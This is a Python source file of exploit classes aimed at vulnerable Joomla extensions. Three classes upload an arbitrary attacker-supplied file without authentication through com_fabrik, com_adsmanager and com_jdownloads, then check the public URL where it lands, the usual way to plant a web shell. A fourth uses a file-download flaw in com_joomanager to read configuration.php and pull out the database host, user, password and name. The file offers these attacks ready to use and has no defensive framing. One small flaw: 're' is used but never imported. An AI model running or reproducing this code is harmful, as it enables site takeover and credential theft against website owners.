#-*- coding: utf-8 -*-
import requests

class joomla_com_fabrik(object):

      def com_fabrik(self,target,path_file,name_file):
          self.target = target
          self.path_file = path_file
          self.name_file = name_file
          requests.post(
            f'{self.target}/index.php?option=com_fabrik&c=import&view=import&filetype=csv&table=',
            data = {
                "name": self.name_file,
                "drop_data": "1",
                "overwrite": "1",
                "field_delimiter": ",",
                "text_delimiter": "&quot;",
                "option": "com_fabrik",
                "controller": "import",
                "view": "import",
                "task": "doimport",
                "Itemid": "0",
                "tableid": "0"
            },
            files = {
                'userfile':(self.name_file,open(self.path_file,'r').read(),'multipart/form-data')
            }
          )
          cek = requests.get(f'{self.target}/media/{self.name_file}')
          return cek.status_code,cek.url
             
class joomla_com_ads_manager(object):

      def com_ads_manager(self,target,path_file,name_file):
          self.target = target
          self.path_file = path_file
          self.name_file = name_file
          requests.post(
            f'{self.target}/index.php?option=com_adsmanager&task=upload&tmpl=component',
            data = {
                'name':self.name_file,
            },
            files = {
                'file':open(self.path_file,'r').read()
            }
          )
          cek = requests.get(f'{self.target}/tmp/plupload/{self.name_file}')
          return cek.status_code,cek.url

class joomla_manager_get_config(object):

      def joomanager_get_config(self,target):
          self.target = target
          data = {}
          r = requests.get(f'{self.target}/index.php?option=com_joomanager&controller=details&task=download&path=configuration.php')
          if 'JConfig' in r.text:
              data['host'] = re.findall("host = '(.*)';",r.text)
              data['user'] = re.findall("user = '(.*)';",r.text)
              data['password'] = re.findall("password = '(.*)';",r.text)
              data['database'] = re.findall("db = '(.*)';",r.text)
              return data
          else:
              return None    

class joomla_com_jdownload(object):

      def com_jdownload(self,target,path_file,name_file,email):
          self.target = target
          self.path_file = path_file
          self.name_file = name_file
          self.email = email
          requests.post(
            f"{self.target}/index.php?option=com_jdownloads&Itemid=0&view=upload",
            data = {
                'name': '407AEX',
                'mail': self.email,
                'catlist': '1',
                'filetitle': "407 AEX",
                'description': "<p>407 Aex</p>",
                '2d1a8f3bd0b5cf542e9312d74fc9766f': 1,
                'send': 1,
                'senden': "Send file",
                'description': 'Test',
                'option': "com_jdownloads",
                'view': "upload"
            },
            files = {
                'file_upload':(
                    self.name_file,open(self.path_file,'r').read(),'multipart/form-data'
                ),
                'pic_upload':(
                    self.name_file,open(self.path_file,'r').read(),'multipart/form-data'
                )
            }
          )
          cek = requests.get(f'{self.target}/images/jdownloads/screenshots/{self.name_file}')
          return cek.status_code,cek.url          